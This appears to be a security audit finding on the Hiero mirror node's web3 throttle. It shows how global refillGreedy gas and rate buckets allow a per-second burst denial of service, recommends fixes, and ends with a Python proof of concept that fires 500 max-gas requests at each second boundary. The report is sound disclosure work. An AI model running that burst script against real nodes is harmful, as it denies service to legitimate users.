### Title
Global `refillGreedy` Gas Bucket Enables Per-Second Burst DoS by Unprivileged Users

### Summary
The `gasLimitBucket()` in `ThrottleConfiguration.java` uses `refillGreedy`, which fills the entire bucket capacity at once at the start of each refill period. Because both the gas bucket and the request-rate bucket are global (shared across all users) with no per-IP or per-user partitioning, an unprivileged attacker can fire a burst of max-gas requests at each second boundary, consuming the entire per-second gas budget before any other user can submit a request. This is repeatable every second, causing sustained denial of service.

### Finding Description

**Exact code path:**

`web3/src/main/java/org/hiero/mirror/web3/config/ThrottleConfiguration.java`, lines 34–45:
```java
@Bean(name = GAS_LIMIT_BUCKET)
Bucket gasLimitBucket() {
    long gasLimit = throttleProperties.getGasPerSecond();   // scaled: 750,000 tokens (default 7.5B / 10,000)
    final var limit = Bandwidth.builder()
            .capacity(gasLimit)
            .refillGreedy(gasLimit, Duration.ofSeconds(1))  // ← entire capacity refills at once
            .build();
    return Bucket.builder()
            .withSynchronizationStrategy(SynchronizationStrategy.SYNCHRONIZED)
            .addLimit(limit)
            .build();
}
```

`web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java`, lines 37–48:
```java
public void throttle(ContractCallRequest request) {
    if (!rateLimitBucket.tryConsume(1)) {           // global, 500 req/sec, also refillGreedy
        throw new ThrottleException(...);
    } else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
        throw new ThrottleException(...);            // global, no per-user partition
    }
    ...
}
```

**Root cause:** `refillGreedy` in bucket4j means the bucket is completely full at the moment of each refill (every second). There is no smoothing — all `N` tokens become available simultaneously. Combined with the fact that both `gasLimitBucket` and `rateLimitBucket` are single global singletons with no per-IP or per-user sub-buckets, a single attacker can atomically drain the entire budget.

**Exploit flow:**

- Default `gasPerSecond = 7_500_000_000` → scaled bucket capacity = `750,000` tokens.
- Default `maxGasLimit = 15,000,000` → scaled cost per max-gas request = `1,500` tokens.
- Requests needed to drain gas bucket = `750,000 / 1,500 = 500`.
- Global `requestsPerSecond = 500` (also `refillGreedy`).

An attacker sends exactly 500 concurrent POST `/api/v1/contracts/call` requests each with `gas = 15,000,000` at the moment the second boundary triggers a refill. All 500 requests pass `rateLimitBucket.tryConsume(1)` (consuming all 500 rate tokens) and collectively consume all 750,000 gas tokens. The bucket is empty for the remainder of that second. The attacker repeats this every second.

**Why existing checks fail:**

- `rateLimitBucket` (500 req/sec): Also global, also `refillGreedy` — the attacker consumes it simultaneously with the gas bucket, not a mitigation.
- `maxGasLimit` validation (`ContractController.java` line 93): Caps each individual request but does not prevent 500 simultaneous max-gas requests.
- `SynchronizationStrategy.SYNCHRONIZED` on `gasLimitBucket`: Prevents internal race conditions within the bucket but does not prevent a single client from draining all tokens.
- `gasLimitRefundPercent = 100` (`ContractCallService.java` line 143): Restores unused gas *after* execution completes. The attacker's requests hold the tokens during execution, and if they use all gas (e.g., complex EVM calls), nothing is restored.
- No IP-based, session-based, or per-account rate limiting exists anywhere in the throttle path.

### Impact Explanation

Every legitimate user is denied service for the full duration of each second the attacker fires their burst. The attacker needs no credentials, no API key, and no special network position — only the ability to send HTTP POST requests. The impact is complete availability loss for the `/api/v1/contracts/call` endpoint, repeatable indefinitely at zero cost to the attacker (requests are rejected cheaply server-side after the bucket is drained).

### Likelihood Explanation

The attack requires no privilege escalation. Any external actor with a script capable of sending 500 concurrent HTTP requests (trivially achievable with tools like `ab`, `wrk`, `hey`, or a simple async Python/Go script) can execute this. Timing to the second boundary is not strictly required — the attacker simply needs to send the burst faster than legitimate traffic can consume tokens, which is easy given the burst is instantaneous. The attack is repeatable every second with no cooldown penalty for the attacker.

### Recommendation

1. **Switch to `refillIntervally`** for both `gasLimitBucket` and `rateLimitBucket`. This distributes token availability evenly across the second (e.g., 1 token every 2ms for 500 req/sec), preventing any single burst from consuming the full budget.
2. **Add per-IP or per-client rate limiting** as a secondary layer (e.g., using a `ConcurrentHashMap<String, Bucket>` keyed on client IP, populated lazily). This ensures no single source can monopolize the global budget.
3. **Consider `refillIntervally` with an initial tokens parameter** set to a fraction of capacity (e.g., 10%) to allow small legitimate bursts while preventing full-budget exhaustion.

### Proof of Concept

```python
import asyncio, aiohttp, time

URL = "http://<mirror-node-host>/api/v1/contracts/call"
PAYLOAD = {
    "to": "0x0000000000000000000000000000000000000001",
    "gas": 15000000,   # maxGasLimit
    "data": "0x"
}

async def send(session):
    async with session.post(URL, json=PAYLOAD) as r:
        return r.status

async def burst():
    # Wait for next second boundary
    now = time.time()
    await asyncio.sleep(1.0 - (now % 1.0))
    async with aiohttp.ClientSession() as session:
        # Fire 500 requests simultaneously
        results = await asyncio.gather(*[send(session) for _ in range(500)])
    throttled = sum(1 for s in results if s == 429)
    print(f"Attacker: {500 - throttled} accepted, {throttled} throttled")

# In a separate terminal, legitimate user:
# curl -X POST http://<host>/api/v1/contracts/call -d '{"gas":21000,...}'
# → receives 429 "Gas per second rate limit exceeded." for the full second

asyncio.run(burst())
```

Expected result: The attacker's 500 requests are accepted (or most of them), and any concurrent legitimate request receives HTTP 429 with `"Gas per second rate limit exceeded."` for the remainder of that second. Repeating `burst()` in a loop sustains the DoS indefinitely.
